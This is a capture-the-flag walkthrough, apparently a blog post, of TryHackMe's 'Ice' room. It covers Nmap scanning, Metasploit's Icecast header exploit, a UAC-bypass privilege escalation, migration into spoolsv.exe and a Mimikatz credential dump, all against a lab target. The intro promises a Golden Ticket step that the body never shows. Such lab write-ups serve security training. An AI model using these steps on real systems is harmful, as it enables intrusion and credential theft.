---
title: "Ice, Ice, Mimi: Unleashing Metasploit and Mimikatz on an Icecast Media Server"
slug: ice-ctf
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

In this walkthrough, we explore the [**Ice**](https://tryhackme.com/room/ice) room on [**TryHackMe**](https://tryhackme.com/), covering steps such as using Nmap for scanning, utilizing the Metasploit Framework to gain initial access, employing the Local Exploit Suggester (LES) tool to identify a vulnerability in the machine's x64 architecture, and leveraging Mimikatz for credential harvesting. We also generate a Golden Ticket to maintain persistence and ultimately perform actions as NT AUTHORITY\\SYSTEM.

### Step 1: Nmap

```bash
nmap -A -T4 -p- 10.10.148.55 -vvv
```

```plaintext
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open                     syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
| rdp-ntlm-info: 
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-07-09T18:41:11+00:00
| ssl-cert: Subject: commonName=Dark-PC
| Issuer: commonName=Dark-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-07-08T18:22:10
| Not valid after:  2024-01-07T18:22:10
| MD5:   9831:6ef7:5e92:9760:c249:d586:381b:76e7
| SHA-1: 84a2:1c70:8e5f:99db:3a94:f9fd:46dd:ef4d:7674:80f2
| -----BEGIN CERTIFICATE-----
| MIIC0jCCAbqgAwIBAgIQYcfKOEyzYYlNI1QQFRyl5DANBgkqhkiG9w0BAQUFADAS
| MRAwDgYDVQQDEwdEYXJrLVBDMB4XDTIzMDcwODE4MjIxMFoXDTI0MDEwNzE4MjIx
| MFowEjEQMA4GA1UEAxMHRGFyay1QQzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
| AQoCggEBAMPu227e3NrhwtK1cHb5cGccDdtublYFtlt3knKlNaAmmfA91mRVbCtp
| oMSWZjdeo97zNNrlnDvCUevBYZwqq/IPvBKx6ZCDoh7DQHg3fLM97Aeu2aJPazT+
| uZzLj/0l21Pj7l8VwXJ4uNIkjAMyFAOMcFZX9wJ3GFv1Y6WRMKtbbNtHK6hIPQJu
| J3FAApUejpAU82jeMu8ssFVaI5Qx0avLHFnjXiuw9VJZdy5GL1vbVikVPHOY1y0r
| sKFz1lJ17XCylqOyM67mpnIokFsfWDLrzK9i1MUGO/oTH/SgJHimFuUjoaGYNvJk
| 3hMxqlNuKJj8P/CBO6rEzkZvoEnD5B8CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYB
| BQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQArG6ezZYbXqyNW
| czj2Lis3plqzim++x0xwhbMPLg6X1HOfAxYlYH9kwhiz/0r/a1GttM1lvQcJohsg
| Y5mbDERytrP1cQ0ZsI02VOlCUpzTVBu3+zFcDj9j6MqeewBSR91NLsQqgl3iZD/T
| WpO3iSPsGhJX5IUUrpEZLwNY2Tj8ZgwTrsfJ+SYSUqAoBJj/lsg2RLP0KM88s0Ew
| jKhw/xfjyP+JxIuB9Y0ulSovYL13qc8wpJ1pWdXT6cxIl16egLi9qarftQeMKFj6
| XodAgaNl2YIHIWjPI5n1p7I90nYm6oDill8YqWossW8tGSnhzZSfYYxS61UJXe07
| d8BSxvcV
|_-----END CERTIFICATE-----
|_ssl-date: 2023-07-09T18:41:17+00:00; +1s from scanner time.
5357/tcp  open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               syn-ack ttl 125 Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/9%OT=135%CT=1%CU=32043%PV=Y%DS=4%DC=T%G=Y%TM=64AAFF4
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:7)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=105%GCD=1%ISR
OS:=10B%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=105%GCD=2%ISR=10B%TI=I%CI=I%II=I%SS
OS:=S%TS=7)OPS(O1=M509NW8ST11%O2=M509NW8ST11%O3=M509NW8NNT11%O4=M509NW8ST11
OS:%O5=M509NW8ST11%O6=M509ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%
OS:W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M509NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.015 days (since Sun Jul  9 12:19:59 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29125/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36751/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 24764/udp): CLEAN (Failed to receive data)
|   Check 4 (port 27462/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-09T13:41:11-05:00
| nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:55:30:30:60:e5 (unknown)
| Names:
|   DARK-PC<00>          Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   DARK-PC<20>          Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02:55:30:30:60:e5:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2023-07-09T18:41:11
|_  start_date: 2023-07-09T18:22:08
```

A lot of interesting ports, but what sticks out to me is the `Icecast Media Server` running on 8000. Let's do some research to see if we can find an exploit for it.

### Step 2: Research Exploit

It appears that a Metasploit module, named `exploit/windows/http/icecast_header`, is available for our use. Let's dive into this, set it up, and execute it against our target.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691770825224/befb8df9-6036-4c9b-9892-5da335a727af.png){: .center-image }

After running the module, we establish a Meterpreter session. The next task we want to perform is scanning the system for potential exploits using the LES module:

```bash
run post/multi/recon/local_exploit_suggester
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771001589/df276068-6309-4b7f-8b28-ee071b93dee4.png){: .center-image }

### Step 3: Elevate Privileges

We will use exploit #1, `exploit/windows/local/bypassuac_eventvwr`, to elevate privileges. We'll proceed to background this session using `CTRL+Z` and then utilize the module.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771088496/4fdcafe1-b173-4eb5-9167-37ccb0374749.png){: .center-image }

Now, let's execute the exploit, and with fingers crossed, we hope to gain elevated privileges.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771117022/45a47133-6a5f-45a7-8cb0-d4501904345b.png){: .center-image }

{% include note.html content="This may take a few tries, requiring you to reset your environment. Patience is key." %}

And we're in! Let's check our privileges and identify the running services so we can migrate to a comparable level for communication with LSASS.

Using `getprivs`:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771200621/cb40d385-3874-4fee-b444-6d631474fd68.png){: .center-image }

Then using `ps` to see services:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771212313/a5eba1c0-78e6-44a9-b1ec-862500de9f01.png){: .center-image }

We want to migrate into `spoolsv.exe`. We can do this with the migrate command:

```bash
migrate -N spoolsv.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771250639/6aec00eb-8cf6-4338-bf99-0b3356194db7.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771266775/9d980f05-fb68-45ed-abff-bb5c6fa4788b.png){: .center-image }

We now have administrative privileges. Let's utilize Mimikatz to extract credentials.

### Step 4: Mimikatz

Within meterpreter type: `load kiwi`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771311651/deb07641-a98b-480b-a72f-10c3d9a83c2d.png){: .center-image }

After loading Kiwi, we receive an expanded help menu.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691771331683/27397a12-e3ac-4d87-ba6e-3d87b0840086.png){: .center-image }

Running the `creds_all` command will retrieve all credentials and display some passwords for us.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691772805082/6f35fa64-c02d-443b-bda1-36211ea7da6e.jpeg){: .center-image }

And that's it! We gained a foothold using an exploit module from the Metasploit framework, utilized LES to identify a vulnerability to exploit in the x64 architecture, deployed the `bypassuac_eventvwr` module to elevate privileges, and finally, we used Mimikatz as `NT AUTHORITY\SYSTEM` to dump credentials from the Windows machine.